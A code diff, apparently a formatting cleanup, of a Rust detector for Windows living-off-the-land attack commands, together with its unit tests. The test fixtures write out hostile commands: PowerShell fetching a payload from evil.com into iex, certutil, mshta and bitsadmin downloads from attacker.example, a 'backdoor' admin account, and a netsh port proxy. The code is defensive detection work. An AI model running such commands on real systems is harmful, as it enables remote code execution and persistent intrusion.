@@ -63,8 +63,12 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
             );
         }
         // Download cradles — fetch and run a remote payload in-memory.
-        if any(&["downloadstring", "downloadfile", "invoke-webrequest", "webclient"])
-            && any(&["http://", "https://", "ftp://"])
+        if any(&[
+            "downloadstring",
+            "downloadfile",
+            "invoke-webrequest",
+            "webclient",
+        ]) && any(&["http://", "https://", "ftp://"])
         {
             push(
                 &mut out,
@@ -77,7 +81,15 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
         // IEX / Invoke-Expression: evaluate a string as code — classic obfuscation pivot.
         // Match all common forms: piped (|iex), function-call (iex(), iex ()),
         // chained (&iex), and the full alias (invoke-expression).
-        if any(&["iex(", "iex (", "|iex", " iex", "&iex", "invoke-expression", ". ("]) {
+        if any(&[
+            "iex(",
+            "iex (",
+            "|iex",
+            " iex",
+            "&iex",
+            "invoke-expression",
+            ". (",
+        ]) {
             push(
                 &mut out,
                 "LolBin.PowerShell.InvokeExpression",
@@ -87,7 +99,11 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
             );
         }
         // Reflective / in-memory loading.
-        if any(&["[reflection.assembly]::load", "system.reflection.assembly", "loadfile("]) {
+        if any(&[
+            "[reflection.assembly]::load",
+            "system.reflection.assembly",
+            "loadfile(",
+        ]) {
             push(
                 &mut out,
                 "LolBin.PowerShell.ReflectiveLoad",
@@ -184,19 +200,18 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
     // -----------------------------------------------------------------------
     // Regsvr32 — "Squiblydoo" (T1218.010)
     // -----------------------------------------------------------------------
-    if s("regsvr32") {
-        if any(&["http://", "https://", "ftp://", "\\\\"])
+    if s("regsvr32")
+        && (any(&["http://", "https://", "ftp://", "\\\\"])
             || (s("/i:") && s("scrobj.dll"))
-            || s("scrobj.dll")
-        {
-            push(
-                &mut out,
-                "LolBin.Regsvr32.ComScriptlet",
-                "T1218.010",
-                Severity::High,
-                "Regsvr32 COM scriptlet (Squiblydoo): load and execute a remote .sct script without AppLocker triggering",
-            );
-        }
+            || s("scrobj.dll"))
+    {
+        push(
+            &mut out,
+            "LolBin.Regsvr32.ComScriptlet",
+            "T1218.010",
+            Severity::High,
+            "Regsvr32 COM scriptlet (Squiblydoo): load and execute a remote .sct script without AppLocker triggering",
+        );
     }
 
     // -----------------------------------------------------------------------
@@ -240,8 +255,7 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
     // BITSAdmin — Background Intelligent Transfer Service (T1197)
     // -----------------------------------------------------------------------
     if s("bitsadmin") {
-        if any(&["/transfer", "/addfile", "/create"]) && any(&["http://", "https://", "\\\\"])
-        {
+        if any(&["/transfer", "/addfile", "/create"]) && any(&["http://", "https://", "\\\\"]) {
             push(
                 &mut out,
                 "LolBin.Bitsadmin.Download",
@@ -264,18 +278,17 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
     // -----------------------------------------------------------------------
     // MSIExec — remote/silent installer (T1218.007)
     // -----------------------------------------------------------------------
-    if s("msiexec") {
-        if any(&["http://", "https://", "ftp://", "\\\\"])
-            && any(&["/q", "/quiet", "/passive"])
-        {
-            push(
-                &mut out,
-                "LolBin.Msiexec.RemoteInstall",
-                "T1218.007",
-                Severity::High,
-                "MSIExec silent remote install: downloading and executing a remote MSI package without UI",
-            );
-        }
+    if s("msiexec")
+        && any(&["http://", "https://", "ftp://", "\\\\"])
+        && any(&["/q", "/quiet", "/passive"])
+    {
+        push(
+            &mut out,
+            "LolBin.Msiexec.RemoteInstall",
+            "T1218.007",
+            Severity::High,
+            "MSIExec silent remote install: downloading and executing a remote MSI package without UI",
+        );
     }
 
     // -----------------------------------------------------------------------
@@ -403,10 +416,7 @@ pub fn analyze(hay: &str) -> Vec<Detection> {
             "net user /add: creating a local account — attacker establishing persistence or pivot",
         );
     }
-    if any(&["net localgroup", "net1 localgroup"])
-        && s("administrators")
-        && s("/add")
-    {
+    if any(&["net localgroup", "net1 localgroup"]) && s("administrators") && s("/add") {
         push(
             &mut out,
             "LolBin.Net.PrivilegeEscalation",
@@ -489,10 +499,14 @@ mod tests {
 
     #[test]
     fn powershell_encoded_command() {
-        let hay = lower("powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAG0AZA==");
+        let hay =
+            lower("powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAG0AZA==");
         let d = analyze(&hay);
         assert!(d.iter().any(|x| x.name.contains("EncodedCommand")), "{d:?}");
-        assert!(d.iter().any(|x| x.name.contains("ExecutionPolicyBypass")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("ExecutionPolicyBypass")),
+            "{d:?}"
+        );
     }
 
     #[test]
@@ -500,14 +514,20 @@ mod tests {
         let hay = lower("powershell -c (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')|iex");
         let d = analyze(&hay);
         assert!(d.iter().any(|x| x.name.contains("DownloadCradle")), "{d:?}");
-        assert!(d.iter().any(|x| x.name.contains("InvokeExpression")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("InvokeExpression")),
+            "{d:?}"
+        );
     }
 
     #[test]
     fn certutil_urlcache_download() {
         let hay = lower("certutil.exe -urlcache -f http://attacker.example/payload.exe C:\\Windows\\Temp\\p.exe");
         let d = analyze(&hay);
-        assert!(d.iter().any(|x| x.name.contains("Certutil.UrlDownload")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Certutil.UrlDownload")),
+            "{d:?}"
+        );
     }
 
     #[test]
@@ -521,37 +541,56 @@ mod tests {
     fn mshta_remote() {
         let hay = lower("mshta.exe http://attacker.example/payload.hta");
         let d = analyze(&hay);
-        assert!(d.iter().any(|x| x.name.contains("Mshta.RemoteHta")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Mshta.RemoteHta")),
+            "{d:?}"
+        );
     }
 
     #[test]
     fn bitsadmin_download_and_persistence() {
         let hay = lower("bitsadmin /create evil & bitsadmin /addfile evil http://attacker.example/p.exe C:\\p.exe & bitsadmin /setnotifycmdline evil C:\\p.exe");
         let d = analyze(&hay);
-        assert!(d.iter().any(|x| x.name.contains("Bitsadmin.Download")), "{d:?}");
-        assert!(d.iter().any(|x| x.name.contains("Bitsadmin.Persistence")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Bitsadmin.Download")),
+            "{d:?}"
+        );
+        assert!(
+            d.iter().any(|x| x.name.contains("Bitsadmin.Persistence")),
+            "{d:?}"
+        );
     }
 
     #[test]
     fn wmic_process_create() {
         let hay = lower("wmic process call create \"powershell -enc JABjAG0AZA==\"");
         let d = analyze(&hay);
-        assert!(d.iter().any(|x| x.name.contains("Wmic.ProcessCreate")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Wmic.ProcessCreate")),
+            "{d:?}"
+        );
     }
 
     #[test]
     fn net_user_add_and_admin() {
-        let hay = lower("net user backdoor P@ssw0rd /add & net localgroup administrators backdoor /add");
+        let hay =
+            lower("net user backdoor P@ssw0rd /add & net localgroup administrators backdoor /add");
         let d = analyze(&hay);
         assert!(d.iter().any(|x| x.name.contains("Net.UserAdd")), "{d:?}");
-        assert!(d.iter().any(|x| x.name.contains("Net.PrivilegeEscalation")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Net.PrivilegeEscalation")),
+            "{d:?}"
+        );
     }
 
     #[test]
     fn netsh_portproxy() {
         let hay = lower("netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.0.2.100 connectport=443");
         let d = analyze(&hay);
-        assert!(d.iter().any(|x| x.name.contains("Netsh.PortProxy")), "{d:?}");
+        assert!(
+            d.iter().any(|x| x.name.contains("Netsh.PortProxy")),
+            "{d:?}"
+        );
     }
 
     #[test]
@@ -565,12 +604,16 @@ mod tests {
     fn benign_strings_yield_nothing() {
         // A normal cargo build command should not trigger any LOLBin rules.
         let hay = lower("cargo build --release --workspace --locked 2>&1");
-        assert!(analyze(&hay).is_empty(), "false positive on benign cargo command");
+        assert!(
+            analyze(&hay).is_empty(),
+            "false positive on benign cargo command"
+        );
     }
 
     #[test]
     fn schtasks_persistence() {
-        let hay = lower("schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'powershell -enc JABj'");
+        let hay =
+            lower("schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'powershell -enc JABj'");
         let d = analyze(&hay);
         assert!(d.iter().any(|x| x.name.contains("Schtasks")), "{d:?}");
     }
